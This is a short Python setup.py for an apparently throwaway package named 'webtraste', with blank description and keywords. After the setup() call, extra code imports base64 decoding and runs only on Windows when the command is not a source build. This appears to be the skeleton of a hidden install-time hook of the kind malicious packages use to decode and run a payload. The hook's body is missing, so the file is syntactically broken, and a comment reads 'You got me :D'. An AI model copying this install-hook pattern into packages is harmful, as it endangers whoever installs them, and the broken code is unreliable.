
from distutils.core import setup
setup(
  name = 'webtraste',
  packages = ['webtraste'],
  version = '0.3',
  license='MIT',
  description = '',
  author = 'WS',
  keywords = [],
  install_requires=[],
  classifiers=[
    'Operating System :: OS Independent',
    'Development Status :: 3 - Alpha',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
)
# You got me :D 
from os import name
from sys import argv
from base64 import b64decode
if 'sdist' not in argv:
    if name == 'nt':
    else:
        pass